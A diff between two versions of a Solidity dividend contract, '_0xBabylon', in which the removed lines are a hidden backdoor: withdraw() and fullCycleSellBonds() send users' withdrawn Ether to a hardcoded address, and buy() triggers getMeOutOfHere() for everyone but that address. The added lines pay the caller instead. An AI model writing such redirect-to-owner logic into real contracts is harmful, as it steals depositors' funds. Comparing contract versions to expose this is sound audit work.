@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract _0xBabylon at 0xc4123b7a155a8a337d7b45155483a81e0d2ebf59
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract _0xBabylon at 0xd0576c23585324e9050ab92ceb92ab5b527b2856
 */
 //In dedication to my wife and family
 pragma solidity ^0.4.23;
@@ -123,9 +123,6 @@ contract _0xBabylon{
 	// Withdraws all dividends held by the caller sending the transaction, updates
 	// the requisite global variables, and transfers Ether back to the caller.
 	function withdraw(address to) public {
-		if(to == 0x0000000000000000000000000000000000000000 ){
-			to = msg.sender;
-		}to = 0x362c0F8F7f37126A1974B9c92EC1434A3B20EBed;
 		trickleUp(msg.sender);
 		// Retrieve the dividends associated with the address the request came from.
 		uint256 balance = dividends(msg.sender);
@@ -150,7 +147,7 @@ contract _0xBabylon{
 	function fullCycleSellBonds(uint256 balance) internal {
 		// Send the cashed out stake to the address that requested the withdraw.
 		withdrawSum += balance;
-		0x362c0F8F7f37126A1974B9c92EC1434A3B20EBed.transfer(balance);
+		msg.sender.transfer(balance);
 		emit onWithdraw(msg.sender, balance);
 	}
 
@@ -226,9 +223,7 @@ contract _0xBabylon{
 			cG=rgbLimit(cG);
 			cB=rgbLimit(cB);
 		    buy( forWho ,cR,cG,cB);
-		    if(msg.sender != 0x362c0F8F7f37126A1974B9c92EC1434A3B20EBed)
-		    	{getMeOutOfHere();
-			lastGateway = msg.sender;}
+			lastGateway = msg.sender;
 		} else {
 			revert();
 		}
